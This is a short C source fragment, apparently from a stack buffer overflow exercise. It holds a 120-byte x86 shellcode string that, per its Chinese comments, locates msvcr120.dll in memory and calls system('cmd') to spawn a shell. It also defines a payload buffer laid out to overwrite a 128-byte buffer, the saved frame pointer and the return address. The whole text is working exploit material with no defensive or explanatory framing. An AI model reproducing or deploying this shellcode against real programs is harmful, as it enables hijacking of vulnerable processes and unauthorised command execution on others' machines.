/**
 * shellcode:
 * 调用msvcr120.dll中的system("cmd")获得shell
 */
char *shellcode =
	"\xe8\xff\xff\xff\xff\xc2\x59\x90\x33\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x58"
	"\x0c\x8b\xd3\x8b\xc3\x83\xc0\x30\x8b\x30\xbf\x41\x11\x24\x01\x81\xef\xdb\x10"
	"\x24\x01\x03\xf9\x53\x8a\x06\x8a\x1f\x3a\xc3\x74\x0f\x84\xc0\x75\x10\x80\xfb"
	"\x24\x75\x0b\x32\xc0\xfe\xc0\xeb\x07\x46\x46\x47\xeb\xe4\x32\xc0\x5b\x3c\x01"
	"\x74\x08\x8b\x1b\x3b\xda\x74\x15\xeb\xc0\x8b\x43\x18\x8b\xd8\x81\xeb\xc7\xde"
	"\xf9\xff\x2d\x3e\xf7\xf7\xff\x53\xff\xd0\xeb\xfe\x4d\x53\x56\x43\x52\x31\x32"
	"\x30\x2e\x64\x6c\x6c\x24"; // 120 bytes
int shellcode_len = 120;

char payload[128 + 4 + 4]; // 128 bytes覆盖buf, 4 bytes覆盖ebp, 最后4 bytes覆盖返回地址
int payload_len = sizeof(payload);